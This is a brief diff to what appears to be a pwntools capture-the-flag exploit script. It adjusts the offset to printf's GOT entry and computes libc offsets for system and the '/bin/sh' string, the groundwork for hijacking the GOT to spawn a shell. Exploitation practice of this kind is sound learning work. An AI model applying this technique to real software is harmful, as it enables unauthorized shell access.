@@ -5,7 +5,7 @@ context(log_level="debug", arch="amd64")
 
 libc = ELF("./libc.so.6")
 
-offset_printf_got = 0x8F28 - 0x9300  # printf@GOT - &values[0]
+offset_printf_got = 0x6290 - 0x7360  # printf@GOT - &values[0]
 offset_system = libc.symbols["system"] - libc.symbols["printf"]
 offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["printf"]
 
